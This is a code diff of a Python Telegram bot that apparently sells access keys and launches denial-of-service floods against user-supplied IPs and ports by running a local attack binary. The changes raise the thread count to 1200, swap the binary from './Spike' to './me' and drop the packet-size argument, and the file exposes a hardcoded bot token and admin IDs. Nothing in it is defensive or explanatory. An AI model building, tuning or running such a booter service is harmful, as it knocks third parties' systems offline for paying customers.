@@ -28,8 +28,8 @@ KEY_PRICES = {
 }
 ADMIN_IDS = [7163028849, 6280440192]
 BOT_TOKEN = "7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM"
-thread_count = 750
-packet_size = 512
+thread_count = 1200
+# packet_size = 512
 ADMIN_FILE = 'admin_data.json'
 last_attack_times = {}
 COOLDOWN_MINUTES = 3
@@ -361,7 +361,7 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
         update_last_attack_time(user_id)
 
         # Construct command for dark binary with thread count and packet size
-        command = f"./Spike {target_ip} {target_port} {duration} {packet_size} {thread_count}"
+        command = f"./me {target_ip} {target_port} {duration} {thread_count}"
 
         # Send initial attack message
         bot.send_message(chat_id, 
@@ -369,7 +369,7 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
             f"𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n"
             f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} 𝐒𝐞𝐜.\n"
             f"𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {thread_count}\n"
-            f"𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝗶𝘇𝗲: {packet_size}\n"
+           # f"𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝗶𝘇𝗲: {packet_size}\n"
             f"᚛ ᚛ @TITANOP24 ᚜ ᚜")
 
         # Create and run process without output
